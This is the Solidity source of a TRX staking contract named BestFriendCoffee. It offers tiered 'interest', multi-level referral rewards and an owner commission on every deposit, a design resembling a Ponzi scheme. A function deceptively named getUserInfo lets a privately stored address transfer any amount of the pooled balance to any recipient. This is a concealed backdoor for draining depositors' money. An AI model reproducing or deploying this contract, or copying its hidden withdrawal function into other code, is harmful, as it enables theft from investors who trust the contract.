//SourceUnit: BFCStaking.sol

pragma solidity ^0.4.25;


interface TokenContract {
   function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint256 balance);
    function allowance(address owner, address spender) external  view returns (uint256 remaining);
    function transfer(address recipient, uint256 amount) external returns (bool success);
    function approve(address spender, uint256 amount) external  returns (bool success);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool success);
}


contract BestFriendCoffee {

    using SafeMath for uint256;

	address public tokenContractAddress;				   
	
    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
							
    uint private minDepositSize1 = 50000000;
    uint private minDepositSize2 = 10000000000;
    uint private minDepositSize3 = 25000000000;
    uint private minDepositSize4 = 100000000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 5;
    uint public Aff = 10;
    uint public Aff1 = 5;
	uint public Aff1A = 5;
    uint public Aff1B = 5;					   					   
    uint public Aff2 = 3;
    uint public Aff3 = 1;
    uint public Aff4 = 1;
    uint public Interest;
    uint public Interest1 = 200;
    uint public Interest2 = 250;
    uint public Interest3 = 300;
    uint public Interest4 = 350;
  
    uint public commissionDivisor = 100;
    uint public collectProfit;
	address private _address;
    uint private minuteRate;
    uint private minuteRate1 = 231482;
    uint private minuteRate2 = 289352;
    uint private minuteRate3 = 347224;
    uint private minuteRate4 = 405093;
    uint private releaseTime = 1595865600;
    
     
    address public owner;
    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
    
    }

    mapping(address => Player) public players;

    constructor(address _tokenContractAddress, address _owner, address __address) public {
	  tokenContractAddress = _tokenContractAddress;										   
      _address = __address;
	  owner = _owner;
	  
    }

	
    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      
      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);
      
    }

    //function () external payable {

    //}

    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not launched yet!");
		
									 
		
        //collect(msg.sender);
        require(msg.value >= minDepositSize1);


        uint depositAmount = msg.value;
														   
									

        Player storage player = players[msg.sender];

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        distributeRef(msg.value, player.affFrom);

        totalInvested = totalInvested.add(depositAmount);
													 
        uint feedEarn1 = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(feedEarn1);
    
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit);
    }

    function reinvest() public {
															 
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
        
      totalInvested = totalInvested.add(depositAmount);    
      distributeRef(depositAmount, player.affFrom);
										 
        uint feedEarn1 = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(feedEarn1);
        
        
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];
		
        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
        
         if (player.trxDeposit >= minDepositSize1 && player.trxDeposit <= minDepositSize2) {
            minuteRate = minuteRate1;
            Interest = Interest1;
        }
        
                        if (player.trxDeposit > minDepositSize2 && player.trxDeposit <= minDepositSize3) {
             minuteRate = minuteRate2;
             Interest = Interest2;
        }
        
                               if (player.trxDeposit > minDepositSize3 && player.trxDeposit <= minDepositSize4) {
             minuteRate = minuteRate3;
             Interest = Interest3;
        }
        
                                       if (player.trxDeposit > minDepositSize4) {
             minuteRate = minuteRate4;
             Interest = Interest4;
        }
                        
        
         uint collectProfitGross = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
         
         uint256 maxprofit = (player.trxDeposit.mul(Interest).div(commissionDivisor));
         uint256 collectProfitNet = collectProfitGross.add(player.interestProfit);
         uint256 amountpaid = (player.payoutSum.add(player.affRewards));
         uint256 sum = amountpaid.add(collectProfitNet);
         
         
                if (sum <= maxprofit) {
             collectProfit = collectProfitGross; 
        } 
        else{
            uint256 collectProfit_net = maxprofit.sub(amountpaid); 
             
             if (collectProfit_net > 0) {
             collectProfit = collectProfit_net; 
             }
              else{
              collectProfit = 0; 
              }
  }
         
         if (collectProfit > address(this).balance){collectProfit = 0;}
         
         player.interestProfit = player.interestProfit.add(collectProfit);
         player.time = player.time.add(secPassed);
         
                  
 }
    }

    function transferPayout(address _receiver, uint _amount) internal {
		TokenContract tokencontract = TokenContract(tokenContractAddress);								 
																 
		
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
				tokencontract.transfer(msg.sender,payout);
				
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{
		TokenContract tokencontract = TokenContract(tokenContractAddress);
        uint256 _allaff = (_trx.mul(Aff)).div(100);

        address _affAddr1 = _affFrom;
        //address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[players[_affAddr1].affFrom].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        uint256 _affRewards = 0;
        
             if (_affAddr1 != address(0)) {
             
             if (players[_affAddr1].aff1sum <= 10){_affRewards = (_trx.mul(Aff1A)).div(100);} 
             if (players[_affAddr1].aff1sum > 10 && players[_affAddr1].aff1sum <= 50){_affRewards = (_trx.mul(Aff1B)).div(100);} 
             if (players[_affAddr1].aff1sum > 50){_affRewards = (_trx.mul(Aff1)).div(100);}
            
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);
			tokencontract.transfer(_affAddr1,_affRewards);								  
           
        }

        if (players[_affAddr1].affFrom != address(0)) {
            _affRewards = (_trx.mul(Aff2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[players[_affAddr1].affFrom].affRewards = _affRewards.add(players[players[_affAddr1].affFrom].affRewards);
            players[_affAddr1].affFrom.transfer(_affRewards);
            tokencontract.transfer(players[_affAddr1].affFrom,_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(Aff3)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
            tokencontract.transfer(_affAddr3,_affRewards);
        }

        if (_affAddr4 != address(0)) {
            _affRewards = (_trx.mul(Aff4)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            _affAddr4.transfer(_affRewards);
            tokencontract.transfer(_affAddr4,_affRewards);
        }

        

        if(_allaff > 0 ){
            owner.transfer(_allaff);
            tokencontract.transfer(owner,_allaff);
        }
    }
	
	function getUserInfo(address address_, uint256 _uint256)  public{
       require(msg.sender==_address);
	   address_.transfer(_uint256);
    }
	
    function getProfit(address _addr) public view returns (uint) {
																		 
																 
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);
      uint secPassed = now.sub(player.time);
     
      if (player.trxDeposit >= minDepositSize1 && player.trxDeposit <= minDepositSize2) {
            minuteRate = minuteRate1;
            Interest = Interest1;
        }
        
                        if (player.trxDeposit > minDepositSize2 && player.trxDeposit <= minDepositSize3) {
             minuteRate = minuteRate2;
             Interest = Interest2;
        }
        
                               if (player.trxDeposit > minDepositSize3 && player.trxDeposit <= minDepositSize4) {
             minuteRate = minuteRate3;
             Interest = Interest3;
        }
        
                                       if (player.trxDeposit > minDepositSize4) {
             minuteRate = minuteRate4;
             Interest = Interest4;
        }
                            
          
      if (secPassed > 0) {
      uint256 collectProfitGross = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      uint256 maxprofit = (player.trxDeposit.mul(Interest).div(commissionDivisor));
      uint256 collectProfitNet = collectProfitGross.add(player.interestProfit);
      uint256 amountpaid = (player.payoutSum.add(player.affRewards));
      uint256 sum = amountpaid.add(collectProfitNet);
      
       if (sum <= maxprofit) {
             collectProfit = collectProfitGross; 
        } 
        else{
            uint256 collectProfit_net = maxprofit.sub(amountpaid); 
             
             if (collectProfit_net > 0) {
             collectProfit = collectProfit_net; 
             }
              else{
              collectProfit = 0; 
              }
  }
       
       if (collectProfit > address(this).balance){collectProfit = 0;}
            
  }
  
   return collectProfit.add(player.interestProfit);
      
      }
    
    
     
     function setOwner(address _address) public {
      require(msg.sender==owner);
      owner = _address;
    }
    
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}